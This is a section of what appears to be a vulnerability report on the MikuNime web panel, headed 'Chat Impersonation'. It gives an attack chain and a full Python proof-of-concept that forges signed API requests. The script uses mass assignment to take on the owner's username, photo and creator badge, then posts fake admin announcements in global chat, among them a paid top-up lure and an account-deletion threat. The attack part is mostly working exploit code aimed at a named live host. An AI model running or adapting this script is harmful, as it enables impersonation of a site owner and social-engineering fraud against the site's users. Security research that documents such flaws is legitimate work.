## 9. CHAT IMPERSONATION

### Vulnerability
Combine mass assignment (username + photoUrl + equippedBadge) with
chat injection to impersonate the owner.

### Attack Chain
```
1. PATCH /api/miku/7/9/me/profile → set username="Yanzz X MikuNime"
2. PATCH /api/miku/7/9/me/profile → set photoUrl=owner's photo
3. PATCH /api/miku/7/9/me/profile → set equippedBadge="creator"
4. POST /api/miku/7/9/global-chats → post admin-like messages
```

### Limitation
Level (1 vs 9999), XP (0 vs 108337), role (user vs Owner) are
server-controlled and cannot be changed. Experienced users will
notice the missing level and color.

### Full PoC Script
```python
import requests, json, time, hmac, hashlib, uuid

PEPPER = "[REDACTED]"
TOKEN  = "miku_[REDACTED]"
HOST   = "https://panel.mikunime.web.id"

def forge(path, method="GET", data=None):
    ts   = int(time.time())
    hour = ts // 3600
    nonce = uuid.uuid4().hex[:16]
    h1   = hmac.new(PEPPER.encode(), f"{TOKEN}:{hour}".encode(), hashlib.sha256).hexdigest()
    sig  = hmac.new(h1.encode(), f"{path}|{ts}|{nonce}".encode(), hashlib.sha256).hexdigest()
    headers = {
        "X-Miku-Signature": sig, "X-Miku-Timestamp": str(ts), "X-Miku-Nonce": nonce,
        "X-Miku-Device-Id": "52b807e726458e93", "X-Miku-Device-Model": "HONOR LGN-NX1",
        "X-Miku-Brand": "HONOR", "X-Miku-OS-Version": "Android 16 (API 36)",
        "Authorization": f"Bearer {TOKEN}", "X-Miku-Auth": "vps",
        "User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Accept": "application/json",
    }
    url = HOST + path
    if method == "GET":  return requests.get(url, headers=headers, timeout=10)
    elif method == "PATCH": return requests.patch(url, headers=headers, json=data, timeout=10)
    elif method == "POST": return requests.post(url, headers=headers, json=data, timeout=10)

# Step 1: Impersonate owner profile
forge("/api/miku/7/9/me/profile", "PATCH", {"username": "Yanzz X MikuNime"})
forge("/api/miku/7/9/me/profile", "PATCH", {
    "photoUrl": "https://cdn.jsdelivr.net/gh/teshotteshot-create/Miku@main/avatars/8mpFy9Jim2ezl7mQGA4vskmdPhw1-1787341419668.jpg"
})
forge("/api/miku/7/9/me/profile", "PATCH", {"equippedBadge": "creator"})

# Step 2: Post admin-like messages
messages = [
    "Update: Server maintenance jam 3 pagi.",
    "Event spesial: Top up 50k dapat VIP 1 tahun!",
    "Akun tidak aktif 7 hari akan dihapus.",
]
for msg in messages:
    r = forge("/api/miku/7/9/global-chats", "POST", {"message": msg})
    print(f"[{r.status_code}] {msg}")
    time.sleep(1)
```

